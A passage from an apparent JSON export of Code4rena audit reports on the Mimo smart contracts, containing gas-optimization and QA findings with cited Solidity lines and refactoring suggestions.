_amount);\ncore/contracts/inception/InceptionVaultsCore.sol:67:    _inceptionCollateral.safeTransferFrom(msg.sender, address(this), _amount);\ncore/contracts/inception/InceptionVaultsCore.sol:93:    _inceptionCollateral.safeTransfer(msg.sender, _amount);\ncore/contracts/inception/InceptionVaultsCore.sol:186:    stablex.safeTransferFrom(msg.sender, address(_adminInceptionVault), _amount);\ncore/contracts/inception/InceptionVaultsCore.sol:234:    stablex.safeTransferFrom(msg.sender, address(this), _amount);\ncore/contracts/inception/InceptionVaultsCore.sol:235:    stablex.safeTransfer(address(_adminInceptionVault), _amount);\ncore/contracts/inception/InceptionVaultsCore.sol:239:    _inceptionCollateral.safeTransfer(msg.sender, collateralToReceive);\ncore/contracts/liquidityMining/v2/DemandMinerV2.sol:67:    _token.safeTransferFrom(msg.sender, address(this), amount);\ncore/contracts/liquidityMining/v2/DemandMinerV2.sol:72:      _token.safeTransfer(_feeCollector, fee);\ncore/contracts/liquidityMining/v2/DemandMinerV2.sol:87:      _token.safeTransfer(_feeCollector, fee);\ncore/contracts/liquidityMining/v2/DemandMinerV2.sol:90:    _token.safeTransfer(msg.sender, withdrawAmount);\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:92:    _par.safeTransferFrom(msg.sender, address(this), amount);\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:101:    _par.safeTransfer(msg.sender, amount);\ncore/contracts/liquidityMining/v2/PARMinerV2.sol:127:    _par.safeTransfer(msg.sender, _liquidateCallerReward);\nsupervaults/contracts/SuperVault.sol:129:    IERC20(asset).transferFrom(msg.sender, address(this), depositAmount);\nsupervaults/contracts/SuperVault.sol:247:    require(asset.transfer(msg.sender, amount));\nsupervaults/contracts/SuperVault.sol:274:    token.transferFrom(msg.sender, address(this), amount);\nsupervaults/contracts/SuperVault.sol:290:    token.transferFrom(msg.sender, address(this), depositAmount);\n```  \n\n## An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  \n  \nCaching the array length in the stack saves around 3 gas per iteration.  \n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```solidity\ncore/contracts/dex/DexAddressProvider.sol:16:    for (uint256 i; i < dexes.length; i++) {\n```\n\n## `++i` costs less gas compared to `i++` or `i += 1`\n\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:  \n  \n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n  \nBut `++i` returns the actual incremented value:  \n  \n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n  \nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  \n  \nInstances include:  \n\n```solidity\ncore/contracts/dex/DexAddressProvider.sol:16:    for (uint256 i; i < dexes.length; i++) {\ncore/contracts/inception/AdminInceptionVault.sol:108:    for (uint8 i = 1; i < _collateralCount + 1; i++) {\ncore/contracts/libraries/ABDKMath64x64.sol:396:            resultShift += 1;\ncore/contracts/libraries/ABDKMath64x64.sol:403:          absXShift += 1;\ncore/contracts/libraries/ABDKMath64x64.sol:463:    if (xc >= 0x2) msb += 1; // No need to shift xc anymore\ncore/contracts/libraries/ABDKMath64x64.sol:624:      if (xc >= 0x2) msb += 1; // No need to shift xc anymore\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\n## Usage of a non-native 256 bits uint as a counter in for-loops increases gas cost\n\nDue to how the EVM natively works on 256 bit numbers, using a 8 bit number in for-loops introduces additional costs as the EVM has to properly enforce the limits of this smaller type.\n\nSee the warning at this link: <https://docs.soliditylang.org/en/v0.8.0/internals/layout_in_storage.html#layout-of-state-variables-in-storage> :\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n> It is only beneficial to use reduced-size arguments if you are dealing with storage values because the compiler will pack multiple elements into one storage slot, and thus, combine multiple reads or writes into a single operation. When dealing with function arguments or memory values, there is no inherent benefit because the compiler does not pack these values.\n  \nAffected code:\n\n```solidity\ncore/contracts/inception/AdminInceptionVault.sol:108:    for (uint8 i = 1; i < _collateralCount + 1; i++) {\n```\n\nConsider manually checking for the upper bound before the for-loop and using the `uint256` type as a counter in the mentioned for-loops.\n\n## Public functions to external\n\nThe following functions could be set external to save gas and improve code quality.\nExternal call cost is less expensive than of public functions.\n\n```solidity\nclone(bytes) should be declared external:\n - SuperVaultFactory.clone(bytes) (contracts/SuperVaultFactory.sol#23-28)\nparallel() should be declared external:\n - DexAddressProvider.parallel() (contracts/dex/DexAddressProvider.sol#43-45)\ndexMapping(uint256) should be declared external:\n - DexAddressProvider.dexMapping(uint256) (contracts/dex/DexAddressProvider.sol#52-54)\ndeposit(address,uint256) should be declared external:\n - AdminInceptionVault.deposit(address,uint256) (contracts/inception/AdminInceptionVault.sol#149-154)\nborrow(uint256,uint256) should be declared external:\n - AdminInceptionVault.borrow(uint256,uint256) (contracts/inception/AdminInceptionVault.sol#164-173)\na() should be declared external:\n - AdminInceptionVault.a() (contracts/inception/AdminInceptionVault.sol#175-177)\ndebtNotifier() should be declared external:\n - AdminInceptionVault.debtNotifier() (contracts/inception/AdminInceptionVault.sol#179-181)\nweth() should be declared external:\n - AdminInceptionVault.weth() (contracts/inception/AdminInceptionVault.sol#183-185)\nmimo() should be declared external:\n - AdminInceptionVault.mimo() (contracts/inception/AdminInceptionVault.sol#187-189)\ninceptionCore() should be declared external:\n - AdminInceptionVault.inceptionCore() (contracts/inception/AdminInceptionVault.sol#191-193)\ncollateralCount() should be declared external:\n - AdminInceptionVault.collateralCount() (contracts/inception/AdminInceptionVault.sol#195-197)\ncollaterals(uint8) should be declared external:\n - AdminInceptionVault.collaterals(uint8) (contracts/inception/AdminInceptionVault.sol#199-201)\ncollateralId(address) should be declared external:\n - AdminInceptionVault.collateralId(address) (contracts/inception/AdminInceptionVault.sol#203-205)\na() should be declared external:\n - InceptionVaultFactory.a() (contracts/inception/InceptionVaultFactory.sol#138-140)\ndebtNotifier() should be declared external:\n - InceptionVaultFactory.debtNotifier() (contracts/inception/InceptionVaultFactory.sol#142-144)\nweth() should be declared external:\n - InceptionVaultFactory.weth() (contracts/inception/InceptionVaultFactory.sol#146-148)\nmimo() should be declared external:\n - InceptionVaultFactory.mimo() (contracts/inception/InceptionVaultFactory.sol#150-152)\nadminInceptionVaultBase() should be declared external:\n - InceptionVaultFactory.adminInceptionVaultBase() (contracts/inception/InceptionVaultFactory.sol#154-156)\ninceptionVaultsCoreBase() should be declared external:\n - InceptionVaultFactory.inceptionVaultsCoreBase() (contracts/inception/InceptionVaultFactory.sol#158-160)\ninceptionVaultsDataProviderBase() should be declared external:\n - InceptionVaultFactory.inceptionVaultsDataProviderBase() (contracts/inception/InceptionVaultFactory.sol#162-164)\ninceptionVaultCount() should be declared external:\n - InceptionVaultFactory.inceptionVaultCount() (contracts/inception/InceptionVaultFactory.sol#166-168)\npriceFeedCount() should be declared external:\n - InceptionVaultFactory.priceFeedCount() (contracts/inception/InceptionVaultFactory.sol#170-172)\ninceptionVaults(uint256) should be declared external:\n - InceptionVaultFactory.inceptionVaults(uint256) (contracts/inception/InceptionVaultFactory.sol#174-176)\npriceFeeds(uint8) should be declared external:\n - InceptionVaultFactory.priceFeeds(uint8) (contracts/inception/InceptionVaultFactory.sol#178-180)\npriceFeedIds(address) should be declared external:\n - InceptionVaultFactory.priceFeedIds(address) (contracts/inception/InceptionVaultFactory.sol#182-184)\ncumulativeRate() should be declared external:\n - InceptionVaultsCore.cumulativeRate() (contracts/inception/InceptionVaultsCore.sol#243-245)\nlastRefresh() should be declared external:\n - InceptionVaultsCore.lastRefresh() (contracts/inception/InceptionVaultsCore.sol#247-249)\nvaultConfig() should be declared external:\n - InceptionVaultsCore.vaultConfig() (contracts/inception/InceptionVaultsCore.sol#251-253)\na() should be declared external:\n - InceptionVaultsCore.a() (contracts/inception/InceptionVaultsCore.sol#255-257)\ninceptionCollateral() should be declared external:\n - InceptionVaultsCore.inceptionCollateral() (contracts/inception/InceptionVaultsCore.sol#259-261)\nadminInceptionVault() should be declared external:\n - InceptionVaultsCore.adminInceptionVault() (contracts/inception/InceptionVaultsCore.sol#263-265)\ninceptionVaultsData() should be declared external:\n - InceptionVaultsCore.inceptionVaultsData() (contracts/inception/InceptionVaultsCore.sol#267-269)\ninceptionPriceFeed() should be declared external:\n - InceptionVaultsCore.inceptionPriceFeed() (contracts/inception/InceptionVaultsCore.sol#271-273)\na() should be declared external:\n - InceptionVaultsDataProvider.a() (contracts/inception/InceptionVaultsDataProvider.sol#161-163)\ninceptionVaultsCore() should be declared external:\n - InceptionVaultsDataProvider.inceptionVaultsCore() (contracts/inception/InceptionVaultsDataProvider.sol#165-167)\ninceptionVaultCount() should be declared external:\n - InceptionVaultsDataProvider.inceptionVaultCount() (contracts/inception/InceptionVaultsDataProvider.sol#169-171)\nbaseDebt() should be declared external:\n - InceptionVaultsDataProvider.baseDebt() (contracts/inception/InceptionVaultsDataProvider.sol#173-175)\na() should be declared external:\n - ChainlinkInceptionPriceFeed.a() (contracts/inception/priceFeed/ChainlinkInceptionPriceFeed.sol#87-89)\ninceptionCollateral() should be declared external:\n - ChainlinkInceptionPriceFeed.inceptionCollateral() (contracts/inception/priceFeed/ChainlinkInceptionPriceFeed.sol#91-93)\nassetOracle() should be declared external:\n - ChainlinkInceptionPriceFeed.assetOracle() (contracts/inception/priceFeed/ChainlinkInceptionPriceFeed.sol#95-97)\neurOracle() should be declared external:\n - ChainlinkInceptionPriceFeed.eurOracle() (contracts/inception/priceFeed/ChainlinkInceptionPriceFeed.sol#99-101)\ndeposit(uint256) should be declared external:\n - DemandMinerV2.deposit(uint256) (contracts/liquidityMining/v2/DemandMinerV2.sol#66-76)\nwithdraw(uint256) should be declared external:\n - DemandMinerV2.withdraw(uint256) (contracts/liquidityMining/v2/DemandMinerV2.sol#82-92)\ntoken() should be declared external:\n - DemandMinerV2.token() (contracts/liquidityMining/v2/DemandMinerV2.sol#94-96)\nfeeCollector() should be declared external:\n - DemandMinerV2.feeCollector() (contracts/liquidityMining/v2/DemandMinerV2.sol#98-100)\nfeeConfig() should be declared external:\n - DemandMinerV2.feeConfig() (contracts/liquidityMining/v2/DemandMinerV2.sol#102-104)\nreleaseRewards(address) should be declared external:\n - GenericMinerV2.releaseRewards(address) (contracts/liquidityMining/v2/GenericMinerV2.sol#80-86)\n - PARMinerV2.releaseRewards(address) (contracts/liquidityMining/v2/PARMinerV2.sol#136-142)\nupdateBoost(address) should be declared external:\n - GenericMinerV2.updateBoost(address) (contracts/liquidityMining/v2/GenericMinerV2.sol#91-94)\nstake(address) should be declared external:\n - GenericMinerV2.stake(address) (contracts/liquidityMining/v2/GenericMinerV2.sol#101-103)\n - PARMinerV2.stake(address) (contracts/liquidityMining/v2/PARMinerV2.sol#172-174)\nstakeWithBoost(address) should be declared external:\n - GenericMinerV2.stakeWithBoost(address) (contracts/liquidityMining/v2/GenericMinerV2.sol#110-112)\n - PARMinerV2.stakeWithBoost(address) (contracts/liquidityMining/v2/PARMinerV2.sol#181-183)\npendingMIMO(address) should be declared external:\n - GenericMinerV2.pendingMIMO(address) (contracts/liquidityMining/v2/GenericMinerV2.sol#119-122)\n - PARMinerV2.pendingMIMO(address) (contracts/liquidityMining/v2/PARMinerV2.sol#190-193)\npendingPAR(address) should be declared external:\n - GenericMinerV2.pendingPAR(address) (contracts/liquidityMining/v2/GenericMinerV2.sol#129-132)\n - PARMinerV2.pendingPAR(address) (contracts/liquidityMining/v2/PARMinerV2.sol#200-207)\npar() should be declared external:\n - GenericMinerV2.par() (contracts/liquidityMining/v2/GenericMinerV2.sol#134-136)\n - PARMinerV2.par() (contracts/liquidityMining/v2/PARMinerV2.sol#209-211)\na() should be declared external:\n - GenericMinerV2.a() (contracts/liquidityMining/v2/GenericMinerV2.sol#138-140)\n - PARMinerV2.a() (contracts/liquidityMining/v2/PARMinerV2.sol#213-215)\nboostConfig() should be declared external:\n - GenericMinerV2.boostConfig() (contracts/liquidityMining/v2/GenericMinerV2.sol#142-144)\n - PARMinerV2.boostConfig() (contracts/liquidityMining/v2/PARMinerV2.sol#217-219)\ntotalStake() should be declared external:\n - GenericMinerV2.totalStake() (contracts/liquidityMining/v2/GenericMinerV2.sol#146-148)\n - PARMinerV2.totalStake() (contracts/liquidityMining/v2/PARMinerV2.sol#221-223)\ntotalStakeWithBoost() should be declared external:\n - GenericMinerV2.totalStakeWithBoost() (contracts/liquidityMining/v2/GenericMinerV2.sol#150-152)\n - PARMinerV2.totalStakeWithBoost() (contracts/liquidityMining/v2/PARMinerV2.sol#225-227)\nuserInfo(address) should be declared external:\n - GenericMinerV2.userInfo(address) (contracts/liquidityMining/v2/GenericMinerV2.sol#164-166)\n - PARMinerV2.userInfo(address) (contracts/liquidityMining/v2/PARMinerV2.sol#243-245)\ndeposit(uint256) should be declared external:\n - PARMinerV2.deposit(uint256) (contracts/liquidityMining/v2/PARMinerV2.sol#91-94)\nwithdraw(uint256) should be declared external:\n - PARMinerV2.withdraw(uint256) (contracts/liquidityMining/v2/PARMinerV2.sol#100-103)\nliquidate(uint256,uint256,uint256,bytes) should be declared external:\n - PARMinerV2.liquidate(uint256,uint256,uint256,bytes) (contracts/liquidityMining/v2/PARMinerV2.sol#112-130)\nrestakePAR(address) should be declared external:\n - PARMinerV2.restakePAR(address) (contracts/liquidityMining/v2/PARMinerV2.sol#148-157)\nupdateBoost(address) should be declared external:\n - PARMinerV2.updateBoost(address) (contracts/liquidityMining/v2/PARMinerV2.sol#162-165)\nliquidateCallerReward() should be declared external:\n - PARMinerV2.liquidateCallerReward() (contracts/liquidityMining/v2/PARMinerV2.sol#229-231)\nbaseDebtChanged(address,uint256) should be declared external:\n - SupplyMinerV2.baseDebtChanged(address,uint256) (contracts/liquidityMining/v2/SupplyMinerV2.sol#45-47)\ncollateral() should be declared external:\n - SupplyMinerV2.collateral() (contracts/liquidityMining/v2/SupplyMinerV2.sol#49-51)\nsyncStake(address) should be declared external:\n - VotingMinerV2.syncStake(address) (contracts/liquidityMining/v2/VotingMinerV2.sol#56-60)\n```\n\n## No need to explicitly initialize variables with default values\n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:\n\n```solidity\ncore/contracts/inception/InceptionVaultsCore.sol:218:    uint256 insuranceAmount = 0;\ncore/contracts/libraries/ABDKMath64x64.sol:153:      bool negativeResult = false;\ncore/contracts/libraries/ABDKMath64x64.sol:222:    bool negativeResult = false;\ncore/contracts/libraries/ABDKMath64x64.sol:387:      uint256 resultShift = 0;\ncore/contracts/libraries/ABDKMath64x64.sol:437:    int256 msb = 0;\n```\n\nI suggest removing explicit initializations for default values.\n\n## Use Custom Errors instead of Revert Strings to save Gas\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include:\n\n```solidity\nsupervaults/contracts/SuperVault.sol:39:    require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), \"SV001\");\nsupervaults/contracts/SuperVault.sol:56:    require(address(_a) != address(0));\nsupervaults/contracts/SuperVault.sol:57:    require(address(_ga) != address(0));\nsupervaults/contracts/SuperVault.sol:58:    require(address(_lendingPool) != address(0));\nsupervaults/contracts/SuperVault.sol:59:    require(address(dexAP) != address(0));\nsupervaults/contracts/SuperVault.sol:83:    require(msg.sender == address(lendingPool), \"SV002\");\nsupervaults/contracts/SuperVault.sol:109:    require(token.balanceOf(address(this)) >= flashloanRepayAmount, \"SV101\");\nsupervaults/contracts/SuperVault.sol:156:    require(fromCollateral.balanceOf(address(this)) >= flashloanRepayAmount, \"SV101\");\nsupervaults/contracts/SuperVault.sol:207:    require(vaultCollateral.balanceOf(address(this)) >= flashloanRepayAmount, \"SV101\");\nsupervaults/contracts/SuperVault.sol:233:    require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\nsupervaults/contracts/SuperVault.sol:247:    require(asset.transfer(msg.sender, amount));\nsupervaults/contracts/SuperVault.sol:255:    require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\nsupervaults/contracts/SuperVault.sol:264:    require(token.transfer(msg.sender, token.balanceOf(address(this))));\nsupervaults/contracts/SuperVault.sol:292:    require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this)))); //par\nsupervaults/contracts/SuperVault.sol:313:    require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this)))); //par\nsupervaults/contracts/SuperVault.sol:344:    require(proxy != address(0) && router != address(0), \"SV201\"); \nsupervaults/contracts/SuperVault.sol:370:      require(ga.mimo().transfer(msg.sender, ga.mimo().balanceOf(address(this))));\nsupervaults/contracts/SuperVaultFactory.sol:18:    require(address(_base) != address(0));\n```\n\nI suggest replacing revert strings with custom errors.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/139"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "* Repeated external calls should be cached when the values between calls do not change, e.g. here ga.mimo() is queried 3 times:\n```solidity\n  if (ga.mimo().balanceOf(address(this)) > 0) {\n    require(ga.mimo().transfer(msg.sender, ga.mimo().balanceOf(address(this))));\n  }\n```\na.core() queried twice:\n```solidity\n  token.approve(address(a.core()), amount);\n  ...\n  a.core().deposit(asset, amount);\n```\na.stablex() twice:\n```solidity\n  require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\n```\n_a.controller() twice:\n```solidity\n  require(_a.controller().hasRole(_a.controller().MANAGER_ROLE(), msg.sender), \"LM010\");\n```\ntoken.balanceOf(address(this) twice:\n```solidity\n    require(token.balanceOf(address(this)) >= flashloanRepayAmount, \"SV101\");\n    a.core().deposit(address(token), token.balanceOf(address(this)) - flashloanRepayAmount);\n```\na.core() 4 times:\n```solidity\n    IERC20(toCollateral).approve(address(a.core()), depositAmount);\n\n    a.core().depositAndBorrow(toCollateral, depositAmount, parAmount);\n    a.core().repay(vaultId, parAmount);\n\n    a.core().withdraw(vaultId, flashloanRepayAmount);\n```\nThere are many more places where this gas-consuming pattern is used, please consider refactoring it by caching these values.\n\n* Repeated storage access could also be cached to reduce gas usage, e.g. _feeConfig depositFee/withdrawFee read twice here:\n```solidity\n    if (_feeConfig.depositFee > 0) {\n      uint256 fee = amount.wadMul(_feeConfig.depositFee);\n\n    if (_feeConfig.withdrawFee > 0) {\n      uint256 fee = amount.wadMul(_feeConfig.withdrawFee);\n```\n\n* Using uint8  does not give any efficiency, actually, it is the opposite as EVM operates on default of 256-bit values so uint8 is more expensive in this case as it needs a conversion. It only gives improvements in cases where you can pack variables together, e.g. structs.\n```solidity\n  uint8 private _collateralCount;\n  mapping(uint8 => address) private _collaterals;\n  mapping(address => uint8) private _collateralId;\n```\n\n* Value of _a.controller().MANAGER_ROLE() never changes, it is a constant, so no need for repeatedly calling, it can be queried and cached once in the constructor:\n```solidity\n   modifier onlyManager() {\n    require(_a.controller().hasRole(_a.controller().MANAGER_ROLE(), msg.sender), \"LM010\");\n    _;\n  }\n```\n\n* It would be cheaper to fail early, e.g. in function withdraw of DemandMinerV2 it might first _decreaseStake and only then perform other actions, so in case the amount is not sufficient, it will waste less gas for the user. Also, it will follow a general good practice of Check-Effects-Interaction that is more robust against re-entrancy attacks.\n\n* No need for SafeMath operations when you know it can't overflow/underflow, e.g. here:\n```solidity\n    if (stake > oldStake) {\n      _increaseStake(user, stake.sub(oldStake));\n    }\n    if (stake < oldStake) {\n      _decreaseStake(user, oldStake.sub(stake));\n    }\n```\n\n* It should be cheapier to cache the storage variable that is accessed inside the loop and eliminate math operation here:\n```solidity\n    for (uint8 i = 1; i < _collateralCount + 1; i++)\n```\nProposed improvement:\n```solidity\n    uint256 _collateralCountLocal = _collateralCount;\n    for (uint8 i = 1; i <= _collateralCountLocal; i++)\n```\n\n* You might want to re-order these lines so that in case the transfer from user fails it will not charge extra gas for the approval:\n```solidity\n    token.approve(address(a.core()), amount);\n    token.transferFrom(msg.sender, address(this), amount);\n```\n```solidity\n    token.approve(address(a.core()), depositAmount);\n    token.transferFrom(msg.sender, address(this), depositAmount);\n```\nor when amount is not enough or other problems arise, it will not execute the external transfer upfront:\n```solidity\n  function withdraw(uint256 amount) public {\n    _par.safeTransfer(msg.sender, amount);\n    _decreaseStake(msg.sender, amount);\n  }\n```",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/138"
    }
  },
  {
    "title": "QA Report",
    "body": "* Please give more meaningful names to variables to ease the work of auditing:\n```solidity\n  IAddressProvider private _a;\n```\n\n* Misleading variable name:\n```solidity\n  uint256 internal constant _MAX_INT = 2**256 - 1;\n```\nFirst, it is UINT, not INT, and second, it is not a max value, it is max - 1. There is a built-in keyword for a max value: ```type(uint256).max```\n\n* DexSet is never emitted, probably an intention was to emit on setDexMapping:\n```solidity\n  event DexSet(uint8);\n```\n\n* function _getNormalizedBalance in BalancerV2LPOracle should validate that decimals <= 18 or use SafeMath to prevent unexpected underflow here:\n```solidity\n  function _getNormalizedBalance(address token, uint256 balance) internal view returns (uint256) {\n    uint8 decimals = ERC20(token).decimals();\n    return balance.mul(MathPow.pow(10, 18 - decimals));\n  }\n```\nConstructor of the GUniLPOracle should also validate that here:\n```solidity\n  _tokenDecimalsOffsetA = 10**(18 - decimalsA);\n  _tokenDecimalsOffsetB = 10**(18 - decimalsB);\n```\n\n* Do not cast explicitly without proper checks, better use SafeCast library to prevent unexpected results:\n```solidity\n  answer = int256(fairResA.mul(pxA).add(fairResB.mul(pxB)).div(pool.totalSupply()));\n```\n\n* function claimMimo iterates over the _collateralCount which in theory is unbounded because it is incremented every time an owner calls depositAndBorrow or borrow with a new _collateralType. If the _collateralCount grows too large, it may lead to a denial of service when claimMimo cannot succeed due to the gas exceeding block limits. Make sure to prevent that, one possible solution is to have a reasonable limit for the maximum _collateralCount.\n\n* PARMinerV2 function liquidate does not validate that dexMapping is set, that is proxy and router addresses are not empty:\n```solidity\n  (address proxy, address router) = _dexAP.dexMapping(dexIndex);\n  collateralToken.approve(proxy, collateralToken.balanceOf(address(this)));\n  router.call(dexTxData);\n```\nIt does not even check the return value and a low-level call succeeds if the address is empty or non-existent. dexMapping is a manually operated config so it may not contain info for all collateral tokens, and in such case, the collateral will remain in PARMinerV2 contract.\n\n* It is not clear why AdminInceptionVault and InceptionVaultFactory have a variable _weth, because it is not used in any meaningful way.\n\n*  function _updateStake declares to return bool but actually does not return anything. Either remove the return declaration or return true/false as per intentions.\n\n* SafeMath is only meant to be used with uint256 type, using it with other types does not prevent overflows/underflows:\n```solidity\n  contract ChainlinkInceptionPriceFeed\n  using SafeMath for uint8;\n  \n  oracleDecimals.add(collateralDecimals)\n```\nIn this specific case, I did not find any serious issue with this, as you use it in a limited way but still you should at least know it and consider casting decimals to uint256 before adding them.\n\n* Careful with possible re-entrancy paths, e.g. in function releaseRewards, make sure you trust all the external contracts and tokens that you call. There are many places where Check-Effects-Interactions pattern is not followed opening gates for potential re-entrancy. Because this is a pretty well-known attack path I expect that you are aware of it and know how to protect from it.\n\n* Because depositToVault or depositAndBorrowFromVault accept any asset, it might be better to validate the balance before/after to know the actual amount transferred which may differ with deflationary or other weird tokens:\n```solidity\n function depositToVault(address asset, uint256 amount) external {\n    ...\n    token.transferFrom(msg.sender, address(this), amount);\n    ...\n  }\n```\n\n* Consider using the Safe ERC20 library and its safeApprove to handle approvals of tokens. But then do not forget to set approval to 0 before setting it to another value.",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/137"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# C4-001: Revert String Size Optimization\n\n## Impact\n\nShortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\n\n## Proof of Concept\n\nRevert strings > 32 bytes are here:\n\n```\n 2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::163 => require(value > 0, \"STAKE_MUST_BE_GREATER_THAN_ZERO\"); //TODO cleanup error message\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::183 => if (pending > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::186 => if (pendingPAR > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::200 => require(value > 0, \"STAKE_MUST_BE_GREATER_THAN_ZERO\"); //TODO cleanup error message\n\n```\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nShorten the revert strings to fit in 32 bytes. That will affect gas optimization.\n\n# C4-002 : Free gas savings for using solidity 0.8.10+\n\n## Impact\n\nUsing newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.\n\n## Proof of Concept\n\n```\nAll Contracts\n```\n\n\nSolidity 0.8.10 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/\n\nCode Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider to upgrade pragma to at least 0.8.10.\n\n\n# C4-003: `> 0 can be replaced with != 0 for gas optimization`\n\n## Impact\n\n`!= 0` is a cheaper operation compared to `> 0`, when dealing with uint.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n   2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::52 => require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::71 => require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::254 => require(_value > 0, \"LM101\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::267 => if (pendingPAR > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::284 => require(_value > 0, \"LM101\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::314 => if (_userInfo.stakeWithBoost > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::319 => if (pendingPAR > 0 && !_restakePAR) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::322 => if (pendingMIMO > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::333 => if (_userInfo.stakeWithBoost > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::31 => if (_userInfo.stakeWithBoost > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::43 => if (pendingMIMO > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::46 => if (pendingPAR > 0) {\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::369 => if (ga.mimo().balanceOf(address(this)) > 0) {\n\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse \"!=0\" instead of \">0\" for the gas optimization.\n\n# C4-004 : Using operator && used more gas\n\n## Impact\n\nUsing double require instead of operator && can save more gas.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::52 => require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::71 => require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\n\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nExample\n\n```\n\nusing &&:\n\nfunction check(uint x)public view{\n    require(x == 0 && x < 1 );\n}\n// gas cost 21630\n\nusing double require:\n\n    require(x == 0 );\n    require( x < 1);\n    }\n}\n// gas cost 21622\n```\n\n\n# C4-005 : There is no need to assign default values to variables\n\n## Impact -  Gas Optimization\n\nWhen a variable is declared solidity assigns the default value. In case the contract assigns the value again, it costs extra gas.\n\nExample: uint 